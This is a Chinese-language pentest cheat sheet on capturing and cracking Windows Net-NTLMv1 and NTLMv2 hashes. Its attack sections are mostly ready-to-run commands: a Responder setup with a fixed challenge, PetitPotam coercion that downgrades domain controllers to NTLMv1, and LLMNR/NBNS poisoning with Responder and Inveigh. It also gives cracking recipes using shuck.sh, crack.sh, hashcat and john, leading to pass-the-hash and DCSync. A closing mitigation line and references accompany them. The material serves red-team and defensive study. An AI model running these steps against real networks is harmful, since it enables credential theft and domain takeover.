# 哈希 - 捕获与破解

## LmCompatibilityLevel

LmCompatibilityLevel 是一项 Windows 安全设置，决定了计算机之间使用的身份验证协议级别。它指定 Windows 如何处理 NTLM 和 LAN Manager（LM）身份验证协议，影响密码的存储方式和身份验证请求的处理方式。级别范围从 0 到 5，级别越高通常提供更安全的身份验证方法。

```ps1
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel
```

* **级别 0** - 发送 LM 和 NTLM 响应；从不使用 NTLM 2 会话安全。客户端使用 LM 和 NTLM 身份验证，从不使用 NTLM 2 会话安全；域控制器接受 LM、NTLM 和 NTLM 2 身份验证。
* **级别 1** - 如果协商成功则使用 NTLM 2 会话安全。客户端使用 LM 和 NTLM 身份验证，如果服务器支持则使用 NTLM 2 会话安全；域控制器接受 LM、NTLM 和 NTLM 2 身份验证。
* **级别 2** - 仅发送 NTLM 响应。客户端仅使用 NTLM 身份验证，如果服务器支持则使用 NTLM 2 会话安全；域控制器接受 LM、NTLM 和 NTLM 2 身份验证。
* **级别 3** - 仅发送 NTLM 2 响应。客户端使用 NTLM 2 身份验证，如果服务器支持则使用 NTLM 2 会话安全；域控制器接受 LM、NTLM 和 NTLM 2 身份验证。
* **级别 4** - 域控制器拒绝 LM 响应。客户端使用 NTLM 身份验证，如果服务器支持则使用 NTLM 2 会话安全；域控制器拒绝 LM 身份验证（即仅接受 NTLM 和 NTLM 2）。
* **级别 5** - 域控制器拒绝 LM 和 NTLM 响应（仅接受 NTLM 2）。客户端使用 NTLM 2 身份验证，如果服务器支持则使用 NTLM 2 会话安全；域控制器拒绝 NTLM 和 LM 身份验证（仅接受 NTLM 2）。客户端与所有服务器通信时只能使用一种协议。例如，无法配置为使用 NTLM v2 连接 Windows 2000 服务器，然后使用 NTLM 连接其他服务器。这是设计使然。

## 捕获 Net-NTLMv1/NTLMv1 哈希

> Net-NTLMv1（NTLMv1）身份验证令牌用于网络身份验证。它们源自基于 DES 的挑战/响应算法，以用户的 NT 哈希作为对称密钥。

:information_source: 使用 PetitPotam 或 SpoolSample 在受影响的机器上强制回调，并将身份验证降级为 **NetNTLMv1 挑战/响应认证**。这使用过时的 DES 加密方法来保护 NT/LM 哈希。

**前提条件**：

* `LmCompatibilityLevel = 0x1`：发送 LM 和 NTLM 响应

**利用方法**：

* 使用 [lgandx/Responder](https://github.com/lgandx/Responder) 进行捕获：编辑 `/etc/responder/Responder.conf` 文件，设置神奇的 **1122334455667788** 挑战值

    ```ps1
    HTTPS = On
    DNS = On
    LDAP = On
    ...
    ; Custom challenge.
    ; Use "Random" for generating a random challenge for each requests (Default)
    Challenge = 1122334455667788
    ```

* 启动 Responder：`responder -I eth0 --lm`，如果设置了 `--disable-ess`，将为 NTLMv1 身份验证禁用扩展会话安全
* 强制回调：

    ```ps1
    PetitPotam.exe Responder-IP DC-IP # 大约在 2021 年 8 月修补
    PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # 对已认证用户未修补
    ```

## 破解 Net-NTLMv1/NTLMv1 哈希

* 如果你获得了一些 `NetNTLMv1 令牌`，可以尝试通过 [shuck.sh](https://shuck.sh/) 在线"剥壳"或通过 [ShuckNT](https://github.com/yanncam/ShuckNT/) 在本地/本机获取 [HIBP 数据库](https://haveibeenpwned.com/Passwords) 中对应的 NT 哈希。如果 NT 哈希之前已泄露，NetNTLMv1 会立即转换为 NT 哈希（可直接用于[哈希传递](./hash-pass-the-hash.md)）。[剥壳过程](https://www.youtube.com/watch?v=OQD3qDYMyYQ)适用于任何有或没有 ESS/SSP 的 NetNTLMv1（挑战 != `1122334455667788`），但主要适用于用户帐户（明文之前已泄露）。

    ```ps1
    # 在线提交 NetNTLMv1 到 https://shuck.sh/get-shucking.php
    # 或通过 ShuckNT 脚本在本地剥壳：
    $ php shucknt.php -f tokens-samples.txt -w pwned-passwords-ntlm-reversed-ordered-by-hash-v8.bin

    [...]
    10 hashes-challenges analyzed in 3 seconds, with 8 NT-Hash instantly broken for pass-the-hash and 1 that can be broken via crack.sh for free.
    [INPUT] ycam::ad:DEADC0DEDEADC0DE00000000000000000000000000000000:70C249F75FB6D2C0AC2C2D3808386CCAB1514A2095C582ED:1122334455667788
    [NTHASH-SHUCKED] 93B3C62269D55DB9CA660BBB91E2BD0B
    ```

* 如果你获得了一些 `NetNTLMv1 令牌`，也可以尝试通过 [crack.sh](https://crack.sh/)/[ntlmv1.com](https://ntlmv1.com/) 破解。为此需要格式化后提交到 [crack.sh](https://crack.sh/netntlm/)/[ntlmv1.com](https://ntlmv1.com/)。可使用 [shuck.sh](https://shuck.sh/) 的转换器轻松格式化。

    ```ps1
    # 当没有 ESS/SSP 且挑战设置为 1122334455667788 时，是免费的（$0）：
    username::hostname:response:response:challenge -> NTHASH:response
    NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972

    # 当存在 ESS/SSP 或挑战 != 1122334455667788 时，需付费 $20-$200：
    username::hostname:lmresponse+0padding:ntresponse:challenge -> $NETNTLM$challenge$ntresponse
    $NETNTLM$DEADC0DEDEADC0DE$507E2A2131F4AF4A299D8845DE296F122CA076D49A80476E
    ```

* 最后，如果无法使用 [shuck.sh](https://shuck.sh/) 或 [crack.sh](https://crack.sh/)，可以尝试使用 Hashcat / John The Ripper 破解 NetNTLMv1。使用 [Net-NTLMv1 彩虹表](https://tables.blurbdust.pw/) 加速明文恢复。

    ```ps1
    john --format=netntlm hash.txt
    hashcat -m 5500 -a 3 hash.txt # NetNTLMv1(-ESS/SSP) 到明文（用户帐户）
    hashcat -m 27000 -a 0 hash.txt nthash-wordlist.txt # NetNTLMv1(-ESS/SSP) 到 NT 哈希（用户和计算机帐户）
    hashcat -m 14000 -a 3 inputs.txt --hex-charset -1 /usr/share/hashcat/charsets/DES_full.hcchr ?1?1?1?1?1?1?1?1 # NetNTLMv1(-ESS/SSP) 到 DES 密钥（KPA 攻击），100% 成功率，然后在 https://shuck.sh/converter.php 用这些 DES 密钥重新生成 NT 哈希
    ```

* 现在你可以使用 DC 机器帐户的哈希传递来执行 DCSync

:warning: 带 ESS / SSP（扩展会话安全 / 安全支持提供程序）的 NetNTLMv1 通过添加新随机数改变最终挑战（!= `1122334455667788`，因此在 [crack.sh](https://crack.sh/) 上需付费）。

:warning: NetNTLMv1 格式为 `login::domain:lmresp:ntresp:clientChall`。如果 `lmresp` 包含 **0 填充**，表示令牌受 **ESS/SSP** 保护。

:warning: 当没有 ESS/SSP 时，NetNTLMv1 最终挑战就是 Responder 的挑战本身（`1122334455667788`）。如果启用了 ESS/SSP，最终挑战是客户端挑战和服务器挑战连接后 MD5 哈希的前 8 字节。

:warning: 如果你从其他工具获得其他格式的令牌，如以 `$MSCHAPv2$`、`$NETNTLM$` 或 `$99$` 前缀开头的令牌，它们对应经典的 NetNTLMv1，可以在[此处](https://shuck.sh/converter.php)进行格式转换。

**缓解措施**：

* 将 Lan Manager 身份验证级别设置为 `仅发送 NTLMv2 响应。拒绝 LM 和 NTLM`

## 捕获和破解 Net-NTLMv2/NTLMv2 哈希

如果网络中的任何用户尝试访问某台机器并输入错误的 IP 或名称，Responder 将代为应答并请求 NTLMv2 哈希以访问资源。Responder 将在网络上投毒 `LLMNR`、`MDNS` 和 `NETBIOS` 请求。

* [lgandx/Responder](https://github.com/lgandx/Responder)

    ```powershell
    sudo ./Responder.py -I eth0 -wfrd -P -v
    ```

* [Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)

    ```powershell
    .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]
    ```

* [EmpireProject/Invoke-Inveigh.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1)

    ```powershell
    Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
    ```

使用 Hashcat / John The Ripper 破解哈希

```ps1
john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt
```

## 参考资料

* [NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021](https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)
* [Practical Attacks against NTLMv1 - Esteban Rodriguez - September 15, 2022](https://trustedsec.com/blog/practical-attacks-against-ntlmv1)
* [Attacking LM/NTLMv1 Challenge/Response Authentication - defence in depth - April 21, 2011](http://www.defenceindepth.net/2011/04/attacking-lmntlmv1-challengeresponse_21.html)
* [CRACKING NETLM/NETNTLMV1 AUTHENTICATION - crack.sh](https://crack.sh/netntlm/)
* [NTLMv1 to NTLM Reversing - evilmog - 03-03-2020](https://hashcat.net/forum/thread-9009-post-47806.html)
